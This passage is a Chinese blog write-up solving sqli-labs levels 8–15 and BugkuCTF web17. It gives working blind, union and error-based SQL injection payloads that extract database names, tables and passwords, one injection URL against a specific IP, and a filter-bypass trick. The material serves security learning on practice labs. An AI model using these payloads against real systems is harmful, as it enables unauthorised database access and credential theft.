关键语句是这么写的 <code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p><p>所以很简单，我们提前闭合就行，让id=’并注释即可闭合</p><p>这题也是一样的，页面只会存在两张状态，所以我们还是通过盲注</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727233513.png"></p><p>报错注入也使用过了，时间注入也使用过了，这次用布尔盲注解题</p><h3 id="布尔盲注简介"><a href="#布尔盲注简介" class="headerlink" title="布尔盲注简介"></a>布尔盲注简介</h3><ul><li><p>在无回显的情况下，我们可以用length来尝试猜测数据库名字长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and length(database()) &gt; 1#</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><p><strong>length()</strong> 返回字符串长度</p><p><strong>ascii()</strong>  它返回参数字符的ascii码值，如果参数长度大于1，那就返回第一个字符的码值。</p><p><strong>substr()</strong> 取子串,截取字符串</p></blockquote><p>简述<strong>猜数据库名</strong>的思路：</p><p>用substr把字符一个个拿出来，判断它的ascii值就可以了！</p><p>使用语句 ascii(substr((select database()),1,1))</p><h3 id="解题-6"><a href="#解题-6" class="headerlink" title="解题"></a>解题</h3><ul><li><p>爆数据库长度</p><p>payload：<code>?id=1&#39; and length(database()) &gt; 7--+</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727233729.png"></p><p>当我们判断长度为8时，发现回显正常，说明数据库长度为8</p></li><li><p>爆库名</p><p>payload：<code>?id=1&#39; and ascii(substr(database(),8,1))&gt;120--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727234228.png"></p><p>利用上面的payload，我们可以判断库名的长度，利用ascii码，判断库名字母是否处于范围中，如上图如果出现 You are in 那么就说明成立</p><ul><li><p>同样利用上面的原理，我们同样能爆出表名</p><p>payload：<code>?id=1&#39; and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;100--+</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727234634.png"></p><p>成功回显说明，表名的第一个字符的ascii码大于100</p><p>由此可继续推断字段名，字段内容等等</p><ul><li>以下是通过python脚本爆出来的结果</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727234856.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210727234914.png"></p><p>如上图，可以看到成功爆出密码</p><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>根据源码 <code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728205005.png"></p><p>看了关键源码后我们发现还是一样的类型，只要提前闭合单引号即可</p><p>并且我们发现<strong>无论输入什么，页面都没有回显</strong>，所以其他注入都不可行，只能使用时间盲注</p><p>通过延迟来判断是否成立</p><h3 id="解题-7"><a href="#解题-7" class="headerlink" title="解题"></a>解题</h3><ul><li><p>如果我们输入 <code>?id=1&#39; and sleep(5)--+</code></p><p>如果显示正常，那么页面会延迟5秒种，（并不会有页面的回显）如下图</p><p>ps：过在MySQL中执行select sleep(N)可以让此语句运行N秒钟：</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728205234.png"></p><p>思路一样，上面已经写过了，那么这题用脚本梭就完事了</p><ul><li><p>爆数据库名：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728204151.png"></p><p>得到数据库名</p></li><li><p>爆字段：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728204215.png"></p></li></ul><ul><li><p>爆字段值：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728211547.png"></p></li></ul><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>先看关键代码 <code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728211713.png"></p><p>原理一样，闭合单引号即可</p><p>这里不多赘述了</p><p>贴上结果</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728212140.png"></p><p>上图爆出表名，可继续爆字段</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>首先界面完全不一样，看到表单，那么这题一定是post注入的题目了，第一关的post应该不难</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728212230.png"></p><p>我们先来看下源码 </p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728212457.png"></p><p>可以发现post了两个值，分别是uname和passwd，并将两个值传入sql语句中，执行操作</p><p>那么我们根据之前的做题经验，我们将post值提前闭合就可，这是一道基于单引号的字符型注入</p><p>那么做题思路都一样，只是传参方式不同罢了</p><h3 id="解题-8"><a href="#解题-8" class="headerlink" title="解题"></a>解题</h3><ul><li><p>猜测有几个字段</p><p>payload（使用post传参）：<code>uname=0&#39; union select 1,2#&amp;passwd=1</code></p><p>这里的passwd的值无所谓，因为只要前面的能注入，出结果就行了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728213523.png"></p><p>看到回显说字段3不存在，说明只有<strong>两个字段</strong></p></li><li><p>爆数据库名</p><p>payload（使用post传参）：<code>uname=0&#39; union select 1,database()#&amp;passwd=1</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728213643.png"></p></li><li><p>爆数据表</p><p>payload（使用post传参）：<code>uname=0&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;passwd=1</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728213840.png"></p><ul><li>爆字段</li></ul><p>​    payload（使用post传参）：<code>uname=0&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)#&amp;passwd=1</code></p><p>![image-20210728213954577](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210728213954577.png)</p><ul><li>爆字段值</li></ul><p>​    payload（使用post传参）：<code>uname=0&#39; union select 1,group_concat(password) from security.users#&amp;passwd=1</code></p><p>​    <img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728214207.png"></p><p>解题完毕</p><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>先看源码 关键源码 <code>@$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1&quot;;</code></p><p>芜湖，又是原理一样的题目，只不过这里是闭合双引号加括号罢了，这种题我们之前做过太多太多了</p><p>简简单单梭哈</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728214353.png"></p><h3 id="解题-9"><a href="#解题-9" class="headerlink" title="解题"></a>解题</h3><p>解法都是一样的，就不多赘述了</p><p>贴几个payload吧！</p><ul><li><p>爆表：</p><p>payload：（post传参）<code>uname=0&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=1</code></p></li></ul><p>![image-20210728215234998](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210728215234998.png)</p><ul><li><p>爆字段值</p><p>payload：<code>uname=0&quot;) union select 1,group_concat(username) from security.users#&amp;passwd=1</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728215347.png"></p></li></ul><p>解题完毕</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>先看源码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728215622.png"></p><p>猜测应该是闭合单引号括号就可以进行注入</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728215956.png"></p><p>我们使用联合注入，但是发现好像页面并<strong>无回显</strong></p><p>试了几次后无果，考虑盲注或者报错注入</p><p>这里采用报错注入的方法</p><h3 id="解题-10"><a href="#解题-10" class="headerlink" title="解题"></a>解题</h3><ul><li><p>报错注入爆数据库名，使用updatexml函数，并闭合uname</p><p>payload：<code>uname=1&#39;) union select updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;passwd=1</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728220442.png"></p></li></ul><p>成功报错回显，显示数据库名，接下来的步骤都一样啦</p><ul><li><p>爆表名</p><p>payload：<code>uname=1&#39;) union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#&amp;passwd=1</code></p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728220626.png"></p><p>爆出表名，接下来不多赘述</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>先看源码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728220731.png"></p><p>啊这，双引号注入，基于双引号的字符型注入</p><p>简简单单，也不分析了吧</p><p>先判断下还是不是利用报错注入</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728221134.png"></p><p>好吧还是，利用联合注入没反应，还得是报错注入</p><h3 id="解题-11"><a href="#解题-11" class="headerlink" title="解题"></a>解题</h3><p>解法与上题一样，改闭合方式即可</p><p>这里就贴一个爆出的字段值的吧</p><p>payload：<code>uname=1&quot; union select updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1)#&amp;passwd=1</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728221923.png"></p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>查看源码如下</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728223104.png"></p><p>好像是单引号闭合</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728223211.png"></p><p>但是我们发现好像并无回显，唯一会变的就是下方的图片样式，让我们再仔细的查看代码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728223316.png"></p><p>如上图，我们发现它把报错注入的提示和提示信息都注释掉了，所以我猜测这题使用盲注与sleep函数进行配合注入</p><h3 id="解题-12"><a href="#解题-12" class="headerlink" title="解题"></a>解题</h3><ul><li><p>判断数据库长度</p><p>payload：<code>uname=admin&#39; and if(length(database()=8),sleep(5),1)#&amp;passwd=1</code></p><p>ps：这里的uname必须为admin才会进行时间盲注，换成其他值都不行，这个疑问还没解决</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728224208.png"></p></li></ul><p>如上图成功延时，这就说明数据库长度为8</p><ul><li><p>爆数据库名</p><p>payload：<code>uname=admin&#39; and if(substr(database(),1,1)=&#39;s&#39;,sleep(5),1)#&amp;passwd=1</code></p><p>如果延时，那么说明数据库的第一个字符为 s</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210728224445.png"></p><p>uname=admin’ and if(substr(database(),2,1)=’e’,sleep(5),1)#&amp;passwd=1</p><p>uname=admin’ and if(substr(database(),3,1)=’c’,sleep(5),1)#&amp;passwd=1</p><p>uname=admin’ and if(substr(database(),4,1)=’u’,sleep(5),1)#&amp;passwd=1</p><p>uname=admin’ and if(substr(database(),5,1)=’r’,sleep(5),1)#&amp;passwd=1</p><p>uname=admin’ and if(substr(database(),6,1)=’i’,sleep(5),1)#&amp;passwd=1</p><p>uname=admin’ and if(substr(database(),7,1)=’t’,sleep(5),1)#&amp;passwd=1</p><p>uname=admin’ and if(substr(database(),8,1)=’y’,sleep(5),1)#&amp;passwd=1</p><p>按照这种方法可以猜测出数据库名</p><p>用同类方法也可以爆出表名，字段名等，不多赘述了</p></li></ul><h1 id="BugkuCTF-web17-成绩表"><a href="#BugkuCTF-web17-成绩表" class="headerlink" title="BugkuCTF web17 成绩表"></a>BugkuCTF web17 成绩表</h1><p>先随便输入数字试试 输入1发现有回显</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503cc84ff6.jpg"></p><p>根据传参可判断这是POST方式，测试一下是不是为sql注入，输入id=1后回显正常</p><p>加入单引号后发现回显不正常，判断为sql注入</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d1e0df7.jpg"></p><p>接下来用order by 语句判断列数</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d31a22c.jpg"></p><p>从4开始吧，构造id=1’ order by 4#，正常回显</p><p>当构造id=1’ order by 5#时，发现回显不正常</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d3a9bf9.jpg"></p><p>由此判断有4列</p><h3 id="之后尝试联合注入，需要把查询数据置空"><a href="#之后尝试联合注入，需要把查询数据置空" class="headerlink" title="之后尝试联合注入，需要把查询数据置空"></a>之后尝试联合注入，需要把查询数据置空</h3><blockquote><p>具体做法是：<strong>id=0’ union select 1,2,3,4#</strong></p></blockquote><h3 id="下面就猜测数据库的库名，版本信息，数据库用户"><a href="#下面就猜测数据库的库名，版本信息，数据库用户" class="headerlink" title="下面就猜测数据库的库名，版本信息，数据库用户"></a>下面就猜测数据库的库名，版本信息，数据库用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips： 没有顺序可言，因为第一个列是成绩单的姓名，所以我们可以把它设为null</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d47b1c2.jpg"></p><h3 id="根据数据库skctf-flag去查询表名"><a href="#根据数据库skctf-flag去查询表名" class="headerlink" title="根据数据库skctf_flag去查询表名"></a>根据数据库skctf_flag去查询表名</h3><p>我们可以构造这么一个pyload，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span><span class="string">&#x27; union select null,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user(),version()#</span></span><br></pre></td></tr></table></figure><p>大致意思就是将第二个列显示出它所有的表名</p><blockquote><p>这个**select group_concat(table_name) from information_schema.tables where table_schema=database() **可以暂且把它当作一个用来查询表名的固定格式</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d5b6888.jpg"></p><p>我们得到了fl4g，可知flag在fl4g的表中，那么下一步我们需要做的就是查询此表中的字段名</p><p>构造pyload</p><blockquote><p>id=0’ union select null,(select group_concat(column_name) from information_schema.columns where table_name=’fl4g’),user(),version()#</p></blockquote><p>注意！！</p><p>这里fl4g是一个表，所以需要加单引号</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d5a95a2.jpg"></p><p>我们得到了 skctf_flag 字段 可知flag在这里了（皆大欢喜）</p><p>接下来就很简单了 直接构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select skctf_flag from fl4g</span><br></pre></td></tr></table></figure><p>可得 pyload</p><blockquote><p>id=0’ union select null,(select skctf_flag from fl4g),user(),version()#</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60a503d5b68e7.jpg"></p><p> 可得flag{aaab401ce593c5d4334e8c565a91b82e}</p><p>列名爆出后 爆当前列下的内容所用指令</p><p><code>select concat_ws(char(32,58,32),username,passwd) from users limit 1,1</code></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><blockquote><p>布尔盲注就是存在注入的页面没有回显，没办法用select 1，2，3….#来判断页面的回显</p></blockquote><p><strong>既需要手工又需要脚本：</strong></p><p><a href="http://219.153.49.228/new_list.php?id=1">http://219.153.49.228/new_list.php?id=1</a> and length(database())&gt;10</p><p>用上述的length函数判断数据库长度</p><p>现当值为10的时候，页面就没有显示为false。那么说明database()的长度是10</p><p>利用/!union/可以绕过对union的过滤</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;sqli-labs搭建以及前15题解答&lt;/h1&gt;

&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;sqli-labs的部署（vps上）&quot;&gt;&lt;a href=&quot;#sqli-labs的部署（vps上）&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    <category term="-学习笔记" scheme="https://blog.abinix.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="SQL注入" scheme="https://blog.abinix.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
